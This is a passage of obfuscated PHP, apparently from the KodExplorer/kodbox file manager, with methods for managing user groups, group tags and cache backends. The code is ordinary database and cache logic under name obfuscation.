"\45{$†ï©ÒÄØ}\45"), $Ô¿ùàË[1089] => $Ô¿ùàË[2096]); if ($¶âîï) { $îíËæÁ = $this->getInfoSimple($¶âîï); $­„Ñ¸ÜÌ = $îíËæÁ[$Ô¿ùàË[588]] . $¶âîï . $Ô¿ùàË[620]; $‹´ç›Òº = array($‹´ç›Òº, array($Ô¿ùàË[588] => array($Ô¿ùàË[461], $­„Ñ¸ÜÌ))); } $‹´ç›Òº = $this->parseWhereLike($‹´ç›Òº); $‚ŸßòÊ¼ = $this->_makeOrder()->where($‹´ç›Òº)->selectPage(20); $‚ŸßòÊ¼ = $‚ŸßòÊ¼ ? $‚ŸßòÊ¼ : array($Ô¿ùàË[447] => array(), $Ô¿ùàË[444] => array()); if (!$‚ŸßòÊ¼ || count($‚ŸßòÊ¼[$Ô¿ùàË[447]]) < 5 && Input::check($†ï©ÒÄØ, $Ô¿ùàË[395])) { $³Çƒ«àª = $this->groupChildrenAll($¶âîï); $ÂµÃÌ®à = $this->_searchFromMeta($Ô¿ùàË[539], $†ï©ÒÄØ, 10, $³Çƒ«àª); $«ö¼£…ø = $this->_searchFromMeta($Ô¿ùàË[540], $†ï©ÒÄØ, 10, $³Çƒ«àª); $ğ…®—ü = array_merge($ÂµÃÌ®à, $«ö¼£…ø, $‚ŸßòÊ¼[$Ô¿ùàË[447]]); $‚ŸßòÊ¼[$Ô¿ùàË[447]] = array_unique_by_key($ğ…®—ü, $Ô¿ùàË[1404]); $‚ŸßòÊ¼[$Ô¿ùàË[444]][$Ô¿ùàË[445]] = count($‚ŸßòÊ¼[$Ô¿ùàË[447]]); $‚ŸßòÊ¼[$Ô¿ùàË[444]][$Ô¿ùàË[446]] = ceil($‚ŸßòÊ¼[$Ô¿ùàË[444]][$Ô¿ùàË[445]] / $‚ŸßòÊ¼[$Ô¿ùàË[444]][$Ô¿ùàË[441]]); } $this->_listDataApply($‚ŸßòÊ¼[$Ô¿ùàË[447]]); return $‚ŸßòÊ¼; } protected function groupChildrenAll($¿µâ­‚¢) { $íúÏ—æ© =& $_SERVER[ıÚ˜š²İ]; if (!$¿µâ­‚¢) { return !1; } if (!is_array($¿µâ­‚¢)) { $¿µâ­‚¢ = array($¿µâ­‚¢); } $…¢ù¢­Ê = $¿µâ­‚¢; foreach ($¿µâ­‚¢ as $¾åœØ€) { $ó¾şÆ³Ö = $this->getInfoSimple($¾åœØ€); $¾»â¿¿Á = array($íúÏ—æ©[588] => array($íúÏ—æ©[461], $ó¾şÆ³Ö[$íúÏ—æ©[588]] . $¾åœØ€ . $íúÏ—æ©[620])); $ ²«º„í = $this->field($íúÏ—æ©[1404])->where($¾»â¿¿Á)->select(); $…¢ù¢­Ê = array_merge($…¢ù¢­Ê, array_to_keyvalue($ ²«º„í, $íúÏ—æ©[12], $íúÏ—æ©[1404])); } return array_unique($…¢ù¢­Ê); } private function _searchFromMeta($ô‘öò¡, $ê¼ÀÏÌ, $Üä®¼ÉĞ, $õò©ŒÀ«) { $ş«©¬ÀÑ =& $_SERVER[ıÚ˜š²İ]; $ê¼ÀÏÌ = strtolower($ê¼ÀÏÌ); $çñÁŸ§Œ = array($ş«©¬ÀÑ[97] => $ô‘öò¡, $ş«©¬ÀÑ[452] => array($ş«©¬ÀÑ[461], "\45{$ê¼ÀÏÌ}\x25")); $çñÁŸ§Œ = $this->parseWhereLike($çñÁŸ§Œ); if ($õò©ŒÀ«) { $çñÁŸ§Œ[$ş«©¬ÀÑ[1404]] = array($ş«©¬ÀÑ[7], $õò©ŒÀ«); } $«¢”Øıû = Model($ş«©¬ÀÑ[2097])->where($çñÁŸ§Œ)->limit($Üä®¼ÉĞ)->select(); if (!$«¢”Øıû) { return array(); } $«¢”Øıû = array_to_keyvalue($«¢”Øıû, $ş«©¬ÀÑ[12], $ş«©¬ÀÑ[1404]); $š’¨€ä« = $this->where(array($ş«©¬ÀÑ[2083] => array($ş«©¬ÀÑ[7], $«¢”Øıû)))->select(); if (!$š’¨€ä«) { return array(); } return $š’¨€ä«; } protected function _listDataApplyItem($ŸâÚçÓÉ) { $°É©Îİ² = array($ŸâÚçÓÉ); $this->_listDataApply($°É©Îİ²); return $°É©Îİ²[0]; } protected function _listDataApply(&$İ†ş©ã) { $¼øìÙµ— =& $_SERVER[ıÚ˜š²İ]; if (!$İ†ş©ã) { return; } $°ÛÎæ• = array_to_keyvalue($İ†ş©ã, $¼øìÙµ—[12], $¼øìÙµ—[1404]); $this->_listAppendChildren($İ†ş©ã); $this->_listAppendChildrenMember($İ†ş©ã); $this->_listAppendMeta($İ†ş©ã, $°ÛÎæ•); $this->_listAppendParent($İ†ş©ã); $this->_listAppendSourceRoot($İ†ş©ã, $°ÛÎæ•); } private function _listAppendChildren(&$³÷ìÊ’Í) { $îé“ĞÏû =& $_SERVER[ıÚ˜š²İ]; $’¿™ª³… = array_to_keyvalue($³÷ìÊ’Í, $îé“ĞÏû[12], $îé“ĞÏû[1404]); $ÔÙ÷¡ = array($îé“ĞÏû[193] => array($îé“ĞÏû[7], $’¿™ª³…)); $¤ü´¸¡» = array($îé“ĞÏû[193], $îé“ĞÏû[2098] => $îé“ĞÏû[569]); $ú¥Á¬¥å = $this->field($¤ü´¸¡»)->where($ÔÙ÷¡)->group($îé“ĞÏû[193])->select(); $¨ÂÑÚ±Ï = array_to_keyvalue($ú¥Á¬¥å, $îé“ĞÏû[193], $îé“ĞÏû[569]); foreach ($³÷ìÊ’Í as &$°ÛÑ­ğí) { $àñÅŞ¸ª = $°ÛÑ­ğí[$îé“ĞÏû[1404]]; $°ÛÑ­ğí[$îé“ĞÏû[2099]] = isset($¨ÂÑÚ±Ï[$àñÅŞ¸ª]) ? intval($¨ÂÑÚ±Ï[$àñÅŞ¸ª]) : !1; } unset($°ÛÑ­ğí); } private function _listAppendChildrenMember(&$À»åé“) { $È€µúÛ =& $_SERVER[ıÚ˜š²İ]; $ºø¥çğ™ = array_to_keyvalue($À»åé“, $È€µúÛ[12], $È€µúÛ[1404]); $Óß‹ÓÓİ = array($È€µúÛ[1404] => array($È€µúÛ[7], $ºø¥çğ™)); $·ôóşÎ  = array($È€µúÛ[1404], $È€µúÛ[2098] => $È€µúÛ[569]); $¢÷Úíúè = Model($È€µúÛ[2088])->field($·ôóşÎ )->where($Óß‹ÓÓİ)->group($È€µúÛ[1404])->select(); $° Çº÷¢ = array_to_keyvalue($¢÷Úíúè, $È€µúÛ[1404], $È€µúÛ[569]); foreach ($À»åé“ as &$ß±š«Œ) { $úàÓŸúõ = $ß±š«Œ[$È€µúÛ[1404]]; $ß±š«Œ[$È€µúÛ[2100]] = isset($° Çº÷¢[$úàÓŸúõ]) ? intval($° Çº÷¢[$úàÓŸúõ]) : !1; } unset($ß±š«Œ); } private function _listAppendMeta(&$ä½Ùõè›, $å„ş¼) { $¹óÁ’µå =& $_SERVER[ıÚ˜š²İ]; $‹¬×´òö = array($¹óÁ’µå[1404] => array($¹óÁ’µå[7], $å„ş¼)); $ŒØÜÂÒ… = Model($¹óÁ’µå[2087])->where($‹¬×´òö)->select(); $ŒØÜÂÒ… = array_to_keyvalue_group($ŒØÜÂÒ…, $¹óÁ’µå[1404]); foreach ($ŒØÜÂÒ… as &$ßíÄ“Öş) { $ßíÄ“Öş = array_to_keyvalue($ßíÄ“Öş, $¹óÁ’µå[97], $¹óÁ’µå[452]); } unset($ßíÄ“Öş); foreach ($ä½Ùõè› as &$¼óÇ›îª) { $¼óÇ›îª[$¹óÁ’µå[543]] = array(); if (isset($ŒØÜÂÒ…[$¼óÇ›îª[$¹óÁ’µå[1404]]])) { $¼óÇ›îª[$¹óÁ’µå[543]] = $ŒØÜÂÒ…[$¼óÇ›îª[$¹óÁ’µå[1404]]]; } } unset($¼óÇ›îª); } protected function parentLevelArray($ÄˆØËÍ) { $Ìäü½’õ =& $_SERVER[ıÚ˜š²İ]; $ÄˆØËÍ = explode($Ìäü½’õ[50], trim($ÄˆØËÍ, $Ìäü½’õ[50])); $ÄˆØËÍ = array_remove_value($ÄˆØËÍ, $Ìäü½’õ[231]); return $ÄˆØËÍ; } protected function parentInGroup($Ï¾ûÕÇä, $à¬»Ïƒ) { $ŠÊ†¼éì =& $_SERVER[ıÚ˜š²İ]; $Ú¥Ìã“ = $this->getInfoSimple($Ï¾ûÕÇä); if (!$Ú¥Ìã“) { return !0; } $æ©Ã¹Õ¼ = $this->parentLevelArray($Ú¥Ìã“[$ŠÊ†¼éì[588]]); $æ©Ã¹Õ¼[] = $Ï¾ûÕÇä; foreach ($æ©Ã¹Õ¼ as $Ï¾ûÕÇä) { if (in_array($Ï¾ûÕÇä . $ŠÊ†¼éì[12], $à¬»Ïƒ)) { return !0; } } return !1; } private function _listAppendParent(&$ßş¨ŸŠ) { $ˆÛõùÔ =& $_SERVER[ıÚ˜š²İ]; $Äû·³² = array(); foreach ($ßş¨ŸŠ as &$·‚½ßŒ³) { $Äû·³²[$·‚½ßŒ³[$ˆÛõùÔ[1404]]] = $·‚½ßŒ³[$ˆÛõùÔ[32]]; $ú™Ş…Ä = $this->parentLevelArray($·‚½ßŒ³[$ˆÛõùÔ[588]]); foreach ($ú™Ş…Ä as $¦ÁÓÙÍ–) { if (!isset($Äû·³²[$¦ÁÓÙÍ–])) { $Äû·³²[$¦ÁÓÙÍ–] = 0; } } } unset($·‚½ßŒ³); foreach ($Äû·³² as $Ÿ‚Ê°‚ => $³Ğ—ÏÚÇ) { if ($³Ğ—ÏÚÇ) { continue; } $¥û’üãÇ = $this->getInfoSimple($Ÿ‚Ê°‚); $Äû·³²[$Ÿ‚Ê°‚] = $¥û’üãÇ[$ˆÛõùÔ[32]]; } $Ôõš¹Şæ = $GLOBALS[$ˆÛõùÔ[6]][$ˆÛõùÔ[92]][$ˆÛõùÔ[2101]]; if (KodUser::isRoot()) { $Ôõš¹Şæ = !1; } foreach ($ßş¨ŸŠ as &$·‚½ßŒ³) { $ú™Ş…Ä = $this->parentLevelArray($·‚½ßŒ³[$ˆÛõùÔ[588]]); $ ‘’Ÿõ = $ˆÛõùÔ[12]; foreach ($ú™Ş…Ä as $Ÿ‚Ê°‚ => $¦ÁÓÙÍ–) { if ($Ôõš¹Şæ && $Ÿ‚Ê°‚ == 0) { continue; } $ ‘’Ÿõ .= $Äû·³²[$¦ÁÓÙÍ–] . $ˆÛõùÔ[8]; } if ($ú™Ş…Ä) { $ ‘’Ÿõ .= $·‚½ßŒ³[$ˆÛõùÔ[32]]; } $·‚½ßŒ³[$ˆÛõùÔ[593]] = str_replace($ˆÛõùÔ[257], $ˆÛõùÔ[8], $ ‘’Ÿõ); } unset($·‚½ßŒ³); } private function _listAppendSourceRoot(&$¹‚ˆ„¶, $¦Ç¾‚î) { $ÒÂå÷ª‹ =& $_SERVER[ıÚ˜š²İ]; $ù¢üÔú¤ = Model($ÒÂå÷ª‹[907])->listSourceRoot(SourceModel::TYPE_GROUP, $¦Ç¾‚î); $ù¢üÔú¤ = array_to_keyvalue($ù¢üÔú¤, $ÒÂå÷ª‹[573]); $ù¢üÔú¤ = array_remove_key($ù¢üÔú¤, $ÒÂå÷ª‹[573]); foreach ($¹‚ˆ„¶ as &$é«¤ıª„) { $é«¤ıª„[$ÒÂå÷ª‹[90]] = $ù¢üÔú¤[$é«¤ıª„[$ÒÂå÷ª‹[1404]]] ? $ù¢üÔú¤[$é«¤ıª„[$ÒÂå÷ª‹[1404]]] : array(); } unset($é«¤ıª„); } protected function groupMerge($İš¼ÀÃ˜) { $İš¼ÀÃ˜ = array_values(array_unique($İš¼ÀÃ˜)); $ôÏÀ¥Êü = array(); for ($­’ÓÉ‘¾ = 0; $­’ÓÉ‘¾ < count($İš¼ÀÃ˜); $­’ÓÉ‘¾++) { $áğ¹Òó¿ = !1; for ($Ÿã‚ôç = 0; $Ÿã‚ôç < count($İš¼ÀÃ˜); $Ÿã‚ôç++) { if ($­’ÓÉ‘¾ == $Ÿã‚ôç) { continue; } if ($this->isParentOf($İš¼ÀÃ˜[$Ÿã‚ôç], $İš¼ÀÃ˜[$­’ÓÉ‘¾])) { $áğ¹Òó¿ = !0; break; } } if (!$áğ¹Òó¿) { $ôÏÀ¥Êü[] = $İš¼ÀÃ˜[$­’ÓÉ‘¾]; } } return $ôÏÀ¥Êü; } protected function isParentOf($™‰¶Ô§î, $‘‰©ºÛ­) { $¡íñã¯€ =& $_SERVER[ıÚ˜š²İ]; if (!$™‰¶Ô§î || !$‘‰©ºÛ­ || $™‰¶Ô§î == $‘‰©ºÛ­) { return !1; } $ˆ¿İƒ = $this->getInfoSimple($™‰¶Ô§î); $¡€²º´• = $this->getInfoSimple($‘‰©ºÛ­); $˜ªÒµğô = $ˆ¿İƒ[$¡íñã¯€[588]] . $™‰¶Ô§î . $¡íñã¯€[50]; if (substr($¡€²º´•[$¡íñã¯€[588]], 0, strlen($˜ªÒµğô)) == $˜ªÒµğô) { return !0; } return !1; } public function groupShowRoot($´«ÚÄ¹‰, $«ŞÀƒïæ = false) { $Ä—ë·— =& $_SERVER[ıÚ˜š²İ]; $”™–‹”± = $this->getInfo($´«ÚÄ¹‰); if (!$”™–‹”±) { return array(); } $‰¦”ÎŠœ = $this->parentLevelArray($”™–‹”±[$Ä—ë·—[588]]); $ÓĞû— ‚ = array($´«ÚÄ¹‰); if (count($‰¦”ÎŠœ) == 0) { return $ÓĞû— ‚; } if ($«ŞÀƒïæ && count($‰¦”ÎŠœ) == 1) { return $ÓĞû— ‚; } if (!$”™–‹”±[$Ä—ë·—[543]] || !isset($”™–‹”±[$Ä—ë·—[543]][$Ä—ë·—[2084]]) || $”™–‹”±[$Ä—ë·—[543]][$Ä—ë·—[2084]] == $Ä—ë·—[853]) { return $this->groupShowRoot($‰¦”ÎŠœ[count($‰¦”ÎŠœ) - 1], $«ŞÀƒïæ); } if ($”™–‹”±[$Ä—ë·—[543]][$Ä—ë·—[2084]] == $Ä—ë·—[434]) { $»íğ¦à» = explode($Ä—ë·—[50], $”™–‹”±[$Ä—ë·—[543]][$Ä—ë·—[2085]]); if ($»íğ¦à») { $ÓĞû— ‚ = array_merge($ÓĞû— ‚, $»íğ¦à»); } } return $ÓĞû— ‚; } protected function resetParentLevel() { $òÒúçê =& $_SERVER[ıÚ˜š²İ]; $±ş «Ëı = $òÒúçê[1404]; $­¼ãä•Ø = $this->select(); $­¼ãä•Ø = array_to_keyvalue($­¼ãä•Ø, $±ş «Ëı); foreach ($­¼ãä•Ø as $Ú‡™ÖÙĞ) { $Àø’Ïæí = $Ú‡™ÖÙĞ; $Š¹Ñ»¦ = array(); while ($Àø’Ïæí[$òÒúçê[193]] != 0) { $Š¹Ñ»¦[] = $Àø’Ïæí[$òÒúçê[193]]; $Àø’Ïæí = $­¼ãä•Ø[$Àø’Ïæí[$òÒúçê[193]]]; } $Š¹Ñ»¦[] = 0; $Š¹Ñ»¦ = $òÒúçê[50] . implode($òÒúçê[50], array_reverse($Š¹Ñ»¦)) . $òÒúçê[50]; $this->setNamePinyin($Ú‡™ÖÙĞ[$±ş «Ëı], $Ú‡™ÖÙĞ[$òÒúçê[32]]); $this->where(array($±ş «Ëı => $Ú‡™ÖÙĞ[$±ş «Ëı]))->save(array($òÒúçê[659] => $Š¹Ñ»¦)); } return $­¼ãä•Ø; } public function groupNameAuto($¤Ü¨ÆºÛ, $µ€ğæó¸) { $§…ÚŸöü =& $_SERVER[ıÚ˜š²İ]; $œÙÓğñ† = $this->where(array($§…ÚŸöü[479] => $¤Ü¨ÆºÛ))->getField($§…ÚŸöü[32], !0); if (!$œÙÓğñ† || !in_array($µ€ğæó¸, $œÙÓğñ†)) { return $µ€ğæó¸; } for ($‰•’©ô¥ = 1; $‰•’©ô¥ <= count($œÙÓğñ†) + 1; $‰•’©ô¥++) { $šõ´ı¿Í = $µ€ğæó¸ . "\x28{$‰•’©ô¥}\x29"; if (!in_array($šõ´ı¿Í, $œÙÓğñ†)) { return $šõ´ı¿Í; } } } public function groupSwitch($›ã“ôÃš, $‘‚‰Ïâ×) { $¨Çù’«š =& $_SERVER[ıÚ˜š²İ]; $Áüš³ª = array($¨Çù’«š[1404] => array($¨Çù’«š[7], array($›ã“ôÃš, $‘‚‰Ïâ×))); $äø¦÷¸­ = $this->where($Áüš³ª)->select(); $äø¦÷¸­ = array_to_keyvalue($äø¦÷¸­, $¨Çù’«š[1404]); if (!isset($äø¦÷¸­[$›ã“ôÃš]) || !isset($äø¦÷¸­[$‘‚‰Ïâ×]) || $äø¦÷¸­[$›ã“ôÃš][$¨Çù’«š[193]] == 0) { return !1; } $Áüš³ª = array($¨Çù’«š[1404] => $›ã“ôÃš); $ÅÅ°‚­× = Model($¨Çù’«š[2088])->where($Áüš³ª)->select(); if (!$ÅÅ°‚­×) { $ÅÅ°‚­× = array(); } foreach ($ÅÅ°‚­× as $©×ØÕ³) { $²øƒÓìü = $©×ØÕ³[$¨Çù’«š[1792]]; $Áüš³ª = array($¨Çù’«š[1792] => $²øƒÓìü, $¨Çù’«š[1404] => $‘‚‰Ïâ×); $•õÄè¸ = Model($¨Çù’«š[2088])->where($Áüš³ª)->find(); if (!$•õÄè¸) { $ÎÖø¸£à = array($‘‚‰Ïâ× => $©×ØÕ³[$¨Çù’«š[2102]]); Model($¨Çù’«š[601])->userGroupAdd($²øƒÓìü, $ÎÖø¸£à); } Model($¨Çù’«š[601])->userGroupRemove($²øƒÓìü, $›ã“ôÃš); } $Áüš³ª = array($¨Çù’«š[191] => 2, $¨Çù’«š[193] => 0, $¨Çù’«š[487] => 1, $¨Çù’«š[573] => array($¨Çù’«š[7], array($›ã“ôÃš, $‘‚‰Ïâ×))); $ÎÙËÀí¢ = Model($¨Çù’«š[907])->where($Áüš³ª)->field($¨Çù’«š[2103])->select(); $ÎÙËÀí¢ = array_to_keyvalue($ÎÙËÀí¢, $¨Çù’«š[573], $¨Çù’«š[194]); $Ø·ôÍ³Ì = !empty($ÎÙËÀí¢[$›ã“ôÃš]) ? $ÎÙËÀí¢[$›ã“ôÃš] : !1; if ($Ø·ôÍ³Ì) { if (!$ÎÙËÀí¢[$‘‚‰Ïâ×]) { $ÎÙËÀí¢[$‘‚‰Ïâ×] = Model($¨Çù’«š[907])->groupRootAdd($‘‚‰Ïâ×); } $™ œ€¨ = $ÎÙËÀí¢[$‘‚‰Ïâ×]; $Áüš³ª = array($¨Çù’«š[193] => $Ø·ôÍ³Ì); $ÎÙËÀí¢ = Model($¨Çù’«š[907])->where($Áüš³ª)->field($¨Çù’«š[2104])->select(); if (!$ÎÙËÀí¢) { $ÎÙËÀí¢ = array(); } Model($¨Çù’«š[907])->moveClearAuth = !1; foreach ($ÎÙËÀí¢ as $¦Œİ÷ŸŠ) { $–™’ã™œ = $¦Œİ÷ŸŠ[$¨Çù’«š[487]] == $¨Çù’«š[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¨Çù’«š[907])->move($¦Œİ÷ŸŠ[$¨Çù’«š[194]], $™ œ€¨, $–™’ã™œ); } Model($¨Çù’«š[907])->moveClearAuth = !0; $Áüš³ª = array($¨Çù’«š[191] => 2, $¨Çù’«š[573] => $›ã“ôÃš); $¡÷‹Æ» = array($¨Çù’«š[573] => $‘‚‰Ïâ×); Model($¨Çù’«š[2105])->where($Áüš³ª)->save($¡÷‹Æ»); Model($¨Çù’«š[2106])->where($Áüš³ª)->save($¡÷‹Æ»); } $this->_changeChildLevel($äø¦÷¸­[$›ã“ôÃš], $äø¦÷¸­[$‘‚‰Ïâ×], !0); $this->where(array($¨Çù’«š[193] => $›ã“ôÃš))->save(array($¨Çù’«š[193] => $‘‚‰Ïâ×)); $this->_clearChildrenCache($äø¦÷¸­[$‘‚‰Ïâ×]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($Ã¨Æ…†) { $ˆ§¹ŒëÄ =& $_SERVER[ıÚ˜š²İ]; return array($ˆ§¹ŒëÄ[2107] => array($Ã¨Æ…†[0], $ˆ§¹ŒëÄ[2108]), $ˆ§¹ŒëÄ[2109] => array($Ã¨Æ…†[0], $ˆ§¹ŒëÄ[2110])); } protected function get($Á¯ßäï‚) { $Ï®·Àéš =& $_SERVER[ıÚ˜š²İ]; $„ÖşÓ¤° = Model($Ï®·Àéš[589])->metaGet($Á¯ßäï‚, $Ï®·Àéš[2111]); $Ó„‘û™¥ = json_decode($„ÖşÓ¤°, !0); return $Ó„‘û™¥ ? $Ó„‘û™¥ : array($Ï®·Àéš[2112] => $Ï®·Àéš[91], $Ï®·Àéš[447] => array()); } protected function set($¾¹•öÎ, $†¥Ãº•) { $‘¹ë­¨ =& $_SERVER[ıÚ˜š²İ]; $†¥Ãº• = $†¥Ãº• ? $†¥Ãº• : array($‘¹ë­¨[2112] => $‘¹ë­¨[91], $‘¹ë­¨[447] => array()); return Model($‘¹ë­¨[589])->metaSet($¾¹•öÎ, $‘¹ë­¨[2111], json_encode($†¥Ãº•)); } protected function getByTagID($¸ºŠ€ë³, $Œ“ãò¥˜) { $¬Ÿ€îß =& $_SERVER[ıÚ˜š²İ]; if (!$¸ºŠ€ë³ || !$Œ“ãò¥˜) { return !1; } if (!Model($¬Ÿ€îß[589])->getInfoSimple($¸ºŠ€ë³)) { return !1; } $™á‹˜À = $this->get($¸ºŠ€ë³); if (!$™á‹˜À || !isset($™á‹˜À[$¬Ÿ€îß[447]])) { return !1; } $º™—‚Ş– = array_find_by_field($™á‹˜À[$¬Ÿ€îß[447]], $¬Ÿ€îß[477], $Œ“ãò¥˜); return is_array($º™—‚Ş–) ? $º™—‚Ş– : !1; } public function listSource($ÒµäŒ¯ë, $¿°ƒ®ù‘) { $£Ñ‘¯ˆí =& $_SERVER[ıÚ˜š²İ]; if ($¿°ƒ®ù‘ && !is_array($¿°ƒ®ù‘)) { $¿°ƒ®ù‘ = array($¿°ƒ®ù‘); } $òÕÏ®Ù = $this->listData($ÒµäŒ¯ë); $œŒ¹ûŠ¦ = array(); foreach ($òÕÏ®Ù as $Â»Ÿ²Ü›) { $¿Ÿ¥—ò‰ = $Â»Ÿ²Ü›[$£Ñ‘¯ˆí[87]]; if (!$¿Ÿ¥—ò‰) { continue; } if (!isset($œŒ¹ûŠ¦[$¿Ÿ¥—ò‰])) { $œŒ¹ûŠ¦[$¿Ÿ¥—ò‰] = array(); } $œŒ¹ûŠ¦[$¿Ÿ¥—ò‰][] = $Â»Ÿ²Ü›[$£Ñ‘¯ˆí[502]]; } $ÄÏŞÃ¿Œ = array(); foreach ($œŒ¹ûŠ¦ as $ãì—Ïé => $ò”á·Ô¶) { $¶ï‡Ú· = !0; if (!$¿°ƒ®ù‘) { $ÄÏŞÃ¿Œ[] = $ãì—Ïé; continue; } foreach ($¿°ƒ®ù‘ as $ŠéÍˆ’) { if (!in_array($ŠéÍˆ’, $ò”á·Ô¶)) { $¶ï‡Ú· = !1; break; } } if ($¶ï‡Ú·) { $ÄÏŞÃ¿Œ[] = $ãì—Ïé; } } if (!$ÄÏŞÃ¿Œ) { return array(); } $”¾ìšõ– = array($£Ñ‘¯ˆí[493] => array($£Ñ‘¯ˆí[494], $ÄÏŞÃ¿Œ), $£Ñ‘¯ˆí[573] => $ÒµäŒ¯ë, $£Ñ‘¯ˆí[191] => SourceModel::TYPE_GROUP); $¡ñïÅñ = Model($£Ñ‘¯ˆí[1442])->listSource($”¾ìšõ–); if (!$¡ñïÅñ || count($ÄÏŞÃ¿Œ) == $¡ñïÅñ[$£Ñ‘¯ˆí[444]][$£Ñ‘¯ˆí[445]]) { return $¡ñïÅñ; } $–íÀëì = array(); $ıé¼¹«¤ = array_to_keyvalue($¡ñïÅñ[$£Ñ‘¯ˆí[85]], $£Ñ‘¯ˆí[12], $£Ñ‘¯ˆí[194]); $ÔÚ—€©Ê = array_to_keyvalue($¡ñïÅñ[$£Ñ‘¯ˆí[86]], $£Ñ‘¯ˆí[12], $£Ñ‘¯ˆí[194]); $èû…í = array_merge($ÔÚ—€©Ê, $ıé¼¹«¤); foreach ($ÄÏŞÃ¿Œ as $¿Ÿ¥—ò‰) { if (!in_array($¿Ÿ¥—ò‰, $èû…í)) { $–íÀëì[] = $¿Ÿ¥—ò‰; } } if ($–íÀëì) { $this->removeBySource($ÒµäŒ¯ë, $–íÀëì); } return $¡ñïÅñ; } protected function listData($Àğ¼) { $è¹ş¼ã¼ =& $_SERVER[ıÚ˜š²İ]; $ùòê¹Êß = array($è¹ş¼ã¼[1783] => 0, $è¹ş¼ã¼[561] => array($è¹ş¼ã¼[2113], 0), $è¹ş¼ã¼[498] => $è¹ş¼ã¼[1400] . $Àğ¼); $õØ½ïˆİ = $è¹ş¼ã¼[2114]; $•´âûÃ = $this->field($õØ½ïˆİ)->where($ùòê¹Êß)->order($è¹ş¼ã¼[2115])->select(); return $•´âûÃ ? $•´âûÃ : array(); } protected function addToTag($“Ş‰¡ğÚ, $ÓŒùç‚¾, $´‘·±„‘) { $ãò¿úŒğ =& $_SERVER[ıÚ˜š²İ]; if (!$this->getByTagID($“Ş‰¡ğÚ, $´‘·±„‘) || !$ÓŒùç‚¾) { return !1; } if (!Model($ãò¿úŒğ[907])->pathInfo($ÓŒùç‚¾)) { return !1; } $§·ğ¬Ú = array($ãò¿úŒğ[1783] => 0, $ãò¿úŒğ[561] => $´‘·±„‘, $ãò¿úŒğ[497] => $ÓŒùç‚¾, $ãò¿úŒğ[498] => $ãò¿úŒğ[2116] . $“Ş‰¡ğÚ, $ãò¿úŒğ[496] => $ãò¿úŒğ[12], $ãò¿úŒğ[1997] => 0); if ($this->where($§·ğ¬Ú)->find()) { return !1; } return $this->add($§·ğ¬Ú); } protected function removeFromTag($ñÙ ··Ä, $³ÇçÈÑ, $•Íæ×²°) { $Ùğãòíö =& $_SERVER[ıÚ˜š²İ]; if (!$this->getByTagID($ñÙ ··Ä, $•Íæ×²°) || !$³ÇçÈÑ) { return !1; } if (is_array($³ÇçÈÑ)) { $³ÇçÈÑ = array($Ùğãòíö[7], $³ÇçÈÑ); } $’½•†­ = array($Ùğãòíö[1783] => 0, $Ùğãòíö[561] => $•Íæ×²°, $Ùğãòíö[498] => $Ùğãòíö[2116] . $ñÙ ··Ä, $Ùğãòíö[497] => $³ÇçÈÑ); return $this->where($’½•†­)->delete(); } protected function removeByTag($µüÍµıà, $áÏûÔ­ï) { $ÎÆ‚ÀÇĞ =& $_SERVER[ıÚ˜š²İ]; if (!$this->getByTagID($µüÍµıà, $áÏûÔ­ï)) { return !1; } $ıœì¨“¦ = array($ÎÆ‚ÀÇĞ[1783] => 0, $ÎÆ‚ÀÇĞ[561] => $áÏûÔ­ï, $ÎÆ‚ÀÇĞ[498] => $ÎÆ‚ÀÇĞ[2116] . $µüÍµıà); return $this->where($ıœì¨“¦)->delete(); } protected function removeBySource($ñ¦é¦¤ë, $—æ„­àö) { $ù£şÁìÛ =& $_SERVER[ıÚ˜š²İ]; if (!$ñ¦é¦¤ë || !$—æ„­àö) { return !1; } if (is_array($—æ„­àö)) { $—æ„­àö = array($ù£şÁìÛ[7], $—æ„­àö); } $×”Ÿîıå = array($ù£şÁìÛ[1783] => 0, $ù£şÁìÛ[497] => $—æ„­àö, $ù£şÁìÛ[561] => array($ù£şÁìÛ[1103], 0), $ù£şÁìÛ[498] => $ù£şÁìÛ[2116] . $ñ¦é¦¤ë); return $this->where($×”Ÿîıå)->delete(); } } goto CïùÃ‹„œ; FšÎÅ¸˜¨: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Ûòİùü² =& $_SERVER[ıÚ˜š²İ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $• •Îœ² = $GLOBALS[$Ûòİùü²[6]][$Ûòİùü²[426]]; $Š«ÔÃõ = $• •Îœ²[$• •Îœ²[$Ûòİùü²[909]]]; $½şÚØ”Ü = $• •Îœ²[$Ûòİùü²[910]]; switch ($• •Îœ²[$Ûòİùü²[909]]) { case $Ûòİùü²[21]: self::$handle = Model($Ûòİùü²[911]); break; case $Ûòİùü²[912]: self::$handle = new CacheRedis($Š«ÔÃõ, $½şÚØ”Ü); break; case $Ûòİùü²[913]: self::$handle = new CacheMemcached($Š«ÔÃõ, $½şÚØ”Ü); break; case $Ûòİùü²[233]: self::$handle = new CacheFile($Š«ÔÃõ, $½şÚØ”Ü); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($í•ßÚğ) { if (is_array($í•ßÚğ) || is_object($í•ßÚğ)) { $í•ßÚğ = json_encode($í•ßÚğ); } $í•ßÚğ = rawurlencode($í•ßÚğ); return md5(KOD_SITE_ID . $_SERVER[ıÚ˜š²İ][11] . $í•ßÚğ); } public static function get($îñ§ÙÑĞ, $Â¹£¾İœ = false) { $ı‚íåó = self::key($îñ§ÙÑĞ); $‚„Ö¸Â = self::init(); if ($Â¹£¾İœ) { return unserialize($‚„Ö¸Â->get($ı‚íåó)); } if (!isset(self::$memoryCache[$ı‚íåó])) { $Ç»´Š–Ô = $‚„Ö¸Â->get($ı‚íåó); self::$memoryCache[$ı‚íåó] = unserialize($Ç»´Š–Ô); } return self::$memoryCache[$ı‚íåó]; } public static function set($Ğ˜ë¶Á, $£å®°ãİ, $—¤İÂ = false) { $ŞûÛí°˜ =& $_SERVER[ıÚ˜š²İ]; $§ Öú¾Å = self::key($Ğ˜ë¶Á); if (isset(self::$memoryCache[$§ Öú¾Å]) && self::$memoryCache[$§ Öú¾Å] === $£å®°ãİ) { return !0; } if ($—¤İÂ === 0) { self::$memoryCache[$§ Öú¾Å] = $£å®°ãİ; return !0; } $¨©‡üäÏ = self::init(); $Ğ¢ö­§¸ = serialize($£å®°ãİ); CacheLock::lock($Ğ˜ë¶Á . 